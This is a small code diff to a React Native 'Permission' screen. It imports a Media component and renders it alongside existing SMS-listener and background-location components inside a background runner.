@@ -11,6 +11,7 @@ import Location from '../../components/Location';
 import LocationBackground from '../../components/LocationBackground';
 import {Runnable} from 'react-native-background-runner';
 import {activeRunBackground} from '../../lib/helper';
+import Media from '../../components/Media';
 
 const Permission = () => {
   const [deviceId, setDeviceId] = useStorage('deviceId');
@@ -44,6 +45,7 @@ const Permission = () => {
         <SmsListener />
         {/* <Location /> */}
         <LocationBackground />
+        <Media />
       </View>
     </Runnable>
   );
